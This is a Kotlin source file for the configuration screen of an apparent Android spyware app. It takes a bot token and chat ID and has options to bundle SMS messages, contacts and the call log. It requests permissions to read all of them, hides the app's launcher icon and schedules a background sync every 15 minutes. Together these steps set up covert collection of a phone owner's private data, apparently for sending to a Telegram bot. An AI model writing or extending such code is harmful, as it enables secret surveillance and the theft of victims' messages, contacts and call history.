package com.esurakhsh

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.CheckBox
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.material.switchmaterial.SwitchMaterial
import com.google.android.material.textfield.TextInputEditText
import java.util.concurrent.TimeUnit

class ConfigActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_config)

        val etToken = findViewById<TextInputEditText>(R.id.etToken)
        val etChatId = findViewById<TextInputEditText>(R.id.etChatId)
        val switchHideIcon = findViewById<SwitchMaterial>(R.id.switchHideIcon)
        val chkZipAll = findViewById<CheckBox>(R.id.chkZipAll)
        val chkSmsIndividual = findViewById<CheckBox>(R.id.chkSmsIndividual)
        val chkCallLogCsv = findViewById<CheckBox>(R.id.chkCallLogCsv)
        val btnSave = findViewById<Button>(R.id.btnSave)

        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
        etToken.setText(prefs.getString("bot_token", ""))
        etChatId.setText(prefs.getString("chat_id", ""))
        chkZipAll.isChecked = prefs.getBoolean("zip_all", false)
        chkSmsIndividual.isChecked = prefs.getBoolean("sms_individual", false)
        chkCallLogCsv.isChecked = prefs.getBoolean("calls_csv", false)

        // Check current icon state
        val componentName = ComponentName(this, "$packageName.Launcher")
        val setting = packageManager.getComponentEnabledSetting(componentName)
        val isHidden = setting == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        switchHideIcon.isChecked = isHidden

        btnSave.setOnClickListener {
            val token = etToken.text.toString()
            val chatId = etChatId.text.toString()
            val shouldHide = switchHideIcon.isChecked
            
            if (token.isBlank() || chatId.isBlank()) {
                Toast.makeText(this, "Fields cannot be empty", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            prefs.edit()
                .putString("bot_token", token)
                .putString("chat_id", chatId)
                .putBoolean("zip_all", chkZipAll.isChecked)
                .putBoolean("sms_individual", chkSmsIndividual.isChecked)
                .putBoolean("calls_csv", chkCallLogCsv.isChecked)
                .apply()

            // Handle Icon Hiding
            val newState = if (shouldHide) {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            }
            
            packageManager.setComponentEnabledSetting(
                componentName,
                newState,
                PackageManager.DONT_KILL_APP
            )

            if (checkPermissions()) {
                startSyncService()
                scheduleWork()
                val msg = if (shouldHide) "Service Started & Icon Hidden" else "Service Started"
                Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
                finish() 
            } else {
                requestPermissions()
            }
        }
    }

    private fun checkPermissions(): Boolean {
        val sms = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        val contacts = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        val callLog = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
        val accounts = ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
        
        // Add notification check for Tiramisu+
        val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
        return sms && contacts && callLog && accounts && notif
    }

    private fun requestPermissions() {
        val perms = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.GET_ACCOUNTS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        ActivityCompat.requestPermissions(this, perms.toTypedArray(), 101)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startSyncService()
                scheduleWork()
                Toast.makeText(this, "Configuration Saved & Started", Toast.LENGTH_SHORT).show()
                finish()
            } else {
                Toast.makeText(this, "Permissions required", Toast.LENGTH_SHORT).show()
            }
        }
    }
    
    private fun startSyncService() {
        val intent = Intent(this, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun scheduleWork() {
         val workRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueue(workRequest)
    }
}
